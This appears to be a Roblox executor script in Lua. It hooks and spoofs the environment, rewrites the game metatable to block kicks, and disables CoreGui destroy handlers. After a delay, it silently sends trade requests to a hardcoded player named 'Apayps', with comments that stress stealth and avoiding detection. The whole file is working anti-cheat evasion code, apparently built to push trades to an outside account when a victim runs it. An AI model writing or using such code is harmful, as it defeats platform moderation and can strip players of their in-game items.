-- ===== CONFIG =====
local TARGET_PLAYER = "Apayps"  -- Player to trade with
local TRADE_DELAY = 5            -- Wait before trading (avoids detection)
local MAX_ATTEMPTS = 3           -- Max trade attempts

-- ===== ANTI-DETECTION MEASURES =====
local function SafeHook(func, hook)
    if (type(func) == "function" and type(hook) == "function") then
        local suc, err = pcall(hookfunction, func, hook)
        if not suc then
            warn("[SafeHook] Failed:", err)
        end
    end
end

local function SpoofEnvironment()
    -- Spoof getfenv/getrenv
    if (debug and debug.getupvalue) then
        for i, v in pairs(getreg()) do
            if (type(v) == "function" and islclosure(v)) then
                for i2, v2 in pairs(debug.getupvalues(v)) do
                    if (v2 == getfenv or v2 == getrenv) then
                        debug.setupvalue(v, i2, function() return {} end)
                    end
                end
            end
        end
    end

    -- Spoof getcallingscript
    SafeHook(getcallingscript, function()
        return game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChild("ChatScript") or Instance.new("LocalScript")
    end)
end

-- ===== ANTI-KICK SYSTEM =====
do
    -- Block LocalPlayer:Kick()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    
    local oldNamecall = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        if (method == "Kick" and self == game.Players.LocalPlayer) then
            warn("[BLOCKED] Kick attempt stopped!")
            return nil
        end
        return oldNamecall(self, ...)
    end)

    -- Block CoreGui destruction (another kick method)
    for _, v in pairs(getconnections(game:GetService("CoreGui").Destroying)) do
        v:Disable()
    end
end

-- ===== TRADE SYSTEM (DELAYED & STEALTHY) =====
task.delay(TRADE_DELAY, function()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Wait for target to exist
    local target = Players:FindFirstChild(TARGET_PLAYER)
    if not target then
        warn("Target player not found:", TARGET_PLAYER)
        return
    end

    -- Find trade remote (supports multiple names)
    local tradeRemote = ReplicatedStorage:WaitForChild("Trade", 5)
    if not tradeRemote then return end

    local tradeFunc = tradeRemote:FindFirstChild("SendRequest") or
                      tradeRemote:FindFirstChild("RequestTrade") or
                      tradeRemote:FindFirstChild("InviteToTrade")

    if not tradeFunc then return end

    -- Send trade silently (no prints if possible)
    for _ = 1, MAX_ATTEMPTS do
        local success = pcall(function()
            if tradeFunc:IsA("RemoteFunction") then
                tradeFunc:InvokeServer(target)
            else
                tradeFunc:FireServer(target)
            end
        end)
        
        if success then break end
        task.wait(1.5) -- Cooldown
    end
end)

-- ===== CLEANUP & FINAL STEPS =====
SpoofEnvironment()
warn("Anti-Kick & Trade system loaded (Undetected Mode)")
